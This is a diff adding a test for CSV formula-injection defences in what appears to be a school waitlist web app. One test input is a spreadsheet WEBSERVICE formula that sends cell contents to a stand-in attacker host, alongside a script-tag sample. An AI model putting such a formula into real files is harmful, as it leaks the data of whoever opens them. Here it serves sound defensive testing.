@@ -507,5 +507,20 @@ const fresh = () => { _test.reset(); table.settings.clear(); table.login_attempt
     dbm.waitlistUnsubscribe = real;
     console.log("ok: unsubscribe links: one token per address, GET changes nothing, only the right token unsubscribes, same answer, escaped, rate-limited");
   }
+  // FIX-LIST #170: a waitlist CSV never carries a live formula; free text is tidied before it reaches the admin
+  {
+    const pages = require("./pages"), dbm = require("./db");
+    const src = /const csvCell = (\(v\) => \{[^\n]*\});/.exec(pages.appPage())[1];
+    const csvCell = eval(src);
+    const evil = '=WEBSERVICE("https://evil.example/?"&A2&B2)';
+    assert.strictEqual(csvCell(evil), '"\'=WEBSERVICE(""https://evil.example/?""&A2&B2)"', "a formula is made text");
+    for (const lead of ["+", "-", "@", "\t", "\r"]) assert.ok(csvCell(lead + "1+1").startsWith("\"'"), "a cell starting with " + JSON.stringify(lead) + " is made text");
+    assert.strictEqual(csvCell("St. Brother André Catholic High School"), '"St. Brother André Catholic High School"', "a plain school is untouched");
+    assert.ok(!/[=<>"]/.test(dbm.tidyText(evil + '<script>"x"</script>')), "no = < > or quotes survive the tidy");
+    assert.strictEqual(dbm.tidyText("Seneca Polytechnic, Seneca@York Campus"), "Seneca Polytechnic, Seneca@York Campus", "real names keep their commas and @");
+    assert.strictEqual(dbm.tidyText("  O’Neil   High\tSchool "), "O’Neil High School");
+    assert.strictEqual(dbm.tidyText("x".repeat(200)).length, 80);
+    console.log("ok: waitlist CSVs: formulas made text; free text tidied for the admin");
+  }
   console.log("ok: admin auth");
 })().catch((e) => { console.error(e); process.exit(1); });
